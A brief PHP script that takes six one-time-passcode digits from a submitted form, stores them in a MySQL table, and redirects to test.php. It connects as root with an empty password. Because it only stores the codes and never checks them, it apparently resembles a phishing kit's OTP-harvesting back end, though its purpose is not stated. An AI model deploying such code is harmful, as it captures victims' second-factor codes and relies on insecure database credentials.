<?php
$servername = "localhost"; // Use 'localhost' if MySQL is on the same machine
$username = "root"; // Replace with your MySQL username
$password =""; // Replace with your MySQL password
$dbname = "luna"; // Replace with your database name

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Prepare and bind
$stmt = $conn->prepare("INSERT INTO lack (otp1, otp2, otp3, otp4, otp5, otp6) VALUES (?, ?, ?, ?, ?, ?)");
$stmt->bind_param("iiiiii", $otp1, $otp2, $otp3, $otp4, $otp5, $otp6 );

// Set parameters and execute
$otp1 = $_POST['otp1'];
$otp2 = $_POST['otp2'];
$otp3 = $_POST['otp3'];
$otp4 = $_POST['otp4'];
$otp5 = $_POST['otp5']; 
$otp6 = $_POST['otp6'];


$stmt->execute();


$stmt->close();
$conn->close();
// Redirect to another page after form submission
header("Location: test.php");
exit();
?>